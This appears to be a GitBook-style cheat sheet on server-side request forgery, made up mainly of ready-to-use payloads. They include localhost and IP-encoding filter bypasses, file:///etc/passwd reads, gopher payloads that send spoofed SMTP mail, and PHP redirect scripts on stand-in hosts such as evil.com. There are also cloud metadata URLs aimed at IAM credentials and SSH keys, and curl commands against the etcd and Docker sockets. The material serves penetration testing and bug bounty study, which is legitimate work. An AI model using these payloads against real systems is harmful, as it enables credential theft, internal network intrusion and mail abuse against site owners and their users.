---
description: Below are some references for the Server-side request forgery (SSRF)attacks.
---

# **Server-side request forgery (SSRF)**

## **Concept**

Server-Side Request Forgery (SSRF) vulnerabilities let an attacker send crafted requests from the back-end server of a vulnerable web application. Criminals usually use SSRF attacks to target internal systems that are behind firewalls and are not accessible from the external network. An attacker may also leverage SSRF to access services available through the loopback interface (127.0.0.1) of the exploited server.

[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

[https://medium.com/swlh/intro-to-ssrf-beb35857771f](https://medium.com/swlh/intro-to-ssrf-beb35857771f)

### **Types of SSRF**

#### **Basic SSRF**

This type of SSRF displays results in the application's front-end response to the attacker, so after the server fetches the URL asked by the attacker for him, it will send the response back to the attacker.

#### **Blind SSRF**

Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.

### **Tools**

[https://ssrftest.com/](https://ssrftest.com/)

[https://github.com/jobertabma/ground-control](https://github.com/jobertabma/ground-control)

[https://github.com/swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap)

[https://github.com/tarunkant/Gopherus](https://github.com/tarunkant/Gopherus)

[https://github.com/teknogeek/ssrf-sheriff](https://github.com/teknogeek/ssrf-sheriff)

[https://github.com/In3tinct/See-SURF](https://github.com/In3tinct/See-SURF)

### **Automating SSRF**

[https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962](https://dant0x65.medium.com/bug-bounty-tip-automating-ssrf-ea344ec59962)

### **Ways to exploit**

[https://medium.com/@vickieli/exploiting-ssrfs-b3a29dd7437](https://medium.com/@vickieli/exploiting-ssrfs-b3a29dd7437)

### **By using localhost**

```markup
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
[or]
http://0.0.0.0:80
http://0.0.0.0:443
http://0.0.0.0:22
[or]
http://localhost:80
http://localhost:443
http://localhost:22
```

### **Bypass localhost with \[::] <a href="#id-6452" id="id-6452"></a>**

```
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:22/ SSH
http://[::]:3128/ Squid
http://0000::1:80/
http://0000::1:25/ SMTP
http://0000::1:22/ SSH
http://0000::1:3128/ Squid
http://127.1/
http://0000::1:80/
http://2130706433/
http://whitelisted@127.0.0.1
http://0x7f000001/
http://017700000001
http://0177.00.00.01
```

### **Bypass localhost with a domain redirecting to localhost**

```
https://xyz.com --->> 127.0.0.1
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost

Other way 
use https://nip.io/
NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, 
even 127.0.0.1.nip.io maps to 127.0.0.1
Like
http://customer1.app.localhost.my.company.127.0.0.1.nip.io will point to 127.0.0.1        
```

### **Bypass using a decimal IP location**

```
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1
```

### **Bypass localhost with CIDR**

```
It's a /8

http://127.127.127.127
http://127.0.1.3
http://127.0.0.0
```

### **[Bypass using IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t\_IPv6IPv4AddressEmbedding.htm)**

```
http://[0:0:0:0:0:ffff:127.0.0.1]
```

### **Bypass using malformed urls**

```
localhost:+11211aaa
localhost:00011211aaaa
```

### **Bypass using rare address**

```
You can short-hand IP addresses by dropping the zeros
http://0/
http://127.1
http://127.0.1
```

### **Bypass using bash variables**

```
cURL only

curl -v "http://evil$google.com"
$google = ""
```

### **Bypass using tricks combination**

```
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
urllib2 : 1.1.1.1
requests + browsers : 2.2.2.2
urllib : 3.3.3.3
```

### **Bypass using enclosed alphanumerics**

```
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com

List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

### **Bypass filter\_var() php function**

```
0://evil.com:80;http://google.com:80/
```

### **[Bypass against a weak parser](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)**

```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
```

![](<../../attachments/image (23).png>)

### **Advanced exploit using a redirection**

```markup
Create a subdomain pointing to 192.168.0.1 with DNS A record.
Launch the SSRF: vulnerable.com/index.php?url=http://YOUR_SERVER_IP
vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
```

### **Advanced exploit using (type=url) while uploading a file/image**

```
Change "type=file" to "type=url"
Paste URL in text field and hit enter
Using this vulnerability users can upload images from any image URL = trigger an SSRF
```

### **Exploitation via URL Scheme**

### **File**

Allows an attacker to fetch the content of a file on the server

```
file://path/to/file
file:///etc/passwd
file://\/\/etc/passwd
ssrf.php?url=file:///etc/passwd
```

### **HTTP**

Allows an attacker to fetch any content from the web, it can also be used to scan ports.

```
ssrf.php?url=http://127.0.0.1:22
ssrf.php?url=http://127.0.0.1:80
ssrf.php?url=http://127.0.0.1:443
```

### **Dict**

The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:

```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```

### **SFTP**

A network protocol used for secure file transfer over secure shell

```
ssrf.php?url=sftp://evil.com:11111/
```

### **TFTP**

Trivial File Transfer Protocol, works over UDP

```
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```

### **LDAP**

Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.

```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```

### **Gopher**

It is a distributed document delivery service. It allows users to explore, search and retrieve information residing on different locations in a seamless fashion.

```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a

will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AH

You didn't say the magic word !


.
QUIT
```

### **Gopher HTTP**

```
gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
gopher://<proxyserver>:8080/_POST%20http://<attacker>:80/x%20HTTP/1.1%0ACookie:%20eatme%0A%0AI+am+a+post+body
```

### **Gopher SMTP - Back connect to 1337**

```
Content of evil.com/redirect.php:
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>

Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```

### **Gopher SMTP - send a mail**

```
Content of evil.com/redirect.php:
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```

### **Netdoc**

Wrapper for Java when your payloads struggle with "\n" and "\r" characters.

```
ssrf.php?url=gopher://127.0.0.1:4242/DATA
```

### **SSRF to XSS**

```
Payload: http://brutelogic.com.br/poc.svg

https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
```

### **SSRF URL for Cloud Instances**

### **[AWS](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)**

```
DNS record

http://instance-data
http://169.254.169.254
http://metadata.nicob.net/
http://169.254.169.254.xip.io/
http://1ynrnhl.xip.io/
http://www.owasp.org.1ynrnhl.xip.io/

HTTP redirect

Static:http://nicob.net/redir6a
Dynamic:http://nicob.net/redir-http-169.254.169.254:80-

Alternate IP encoding

http://425.510.425.510/ Dotted decimal with overflow
http://2852039166/ Dotless decimal
http://7147006462/ Dotless decimal with overflow
http://0xA9.0xFE.0xA9.0xFE/ Dotted hexadecimal
http://0xA9FEA9FE/ Dotless hexadecimal
http://0x41414141A9FEA9FE/ Dotless hexadecimal with overflow
http://0251.0376.0251.0376/ Dotted octal
http://0251.00376.000251.0000376/ Dotted octal with padding

More urls to include

http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### **[Google Cloud](ttps://cloud.google.com/compute/docs/metadata)**

```
# **- Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"**
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id

# **Google allows recursive pulls**
http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true

## **Google**
# **Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)**
http://metadata.google.internal/computeMetadata/v1beta1
```

### **[Digital Ocean](https://developers.digitalocean.com/documentation/metadata/)**

```
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/ 
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
```

### **Packetcloud**

```
https://metadata.packet.net/userdata
```

### **[Azure](https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service)**

```
#Limited, maybe more exist?
http://169.254.169.254/metadata/v1/maintenance

#Update Apr 2017, Azure has more support; requires the header "Metadata: true" 
#https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service

http://169.254.169.254/metadata/instance?api-version=2017-04-02
http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
```

### **OpenStack/RackSpace**

```
# **(header required? unknown)**
http://169.254.169.254/openstack
```

### **HP Helion**

```
# **(header required? unknown)**
http://169.254.169.254/2009-04-04/meta-data/ 
```

### **Oracle Cloud**

```
http://192.0.0.192/latest/
http://192.0.0.192/latest/user-data/
http://192.0.0.192/latest/meta-data/
http://192.0.0.192/latest/attributes/
```

### **Alibaba**

```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/image-id
```

### **Kubernetes ETCD**

Can contain API keys and internal ip and ports

```
curl -L http://127.0.0.1:2379/version
curl http://127.0.0.1:2379/v2/keys/?recursive=true
```

### **Docker**

```
http://127.0.0.1:2375/v1.24/containers/json

Simple example
docker run -ti -v /var/run/docker.sock:/var/run/docker.sock bash
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/containers/json
bash-4.4# curl --unix-socket /var/run/docker.sock http://foo/images/json
```

### **[Rancher](https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-service/)**

```
curl http://rancher-metadata/<version>/<path>
```

### **References**

```
https://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf
```

[https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978)

[https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0)

[https://subhajitsaha.com/bypassing-ssrfs-like-a-king/](https://subhajitsaha.com/bypassing-ssrfs-like-a-king/)

[https://github.com/jdonsec/AllThingsSSRF](https://github.com/jdonsec/AllThingsSSRF)



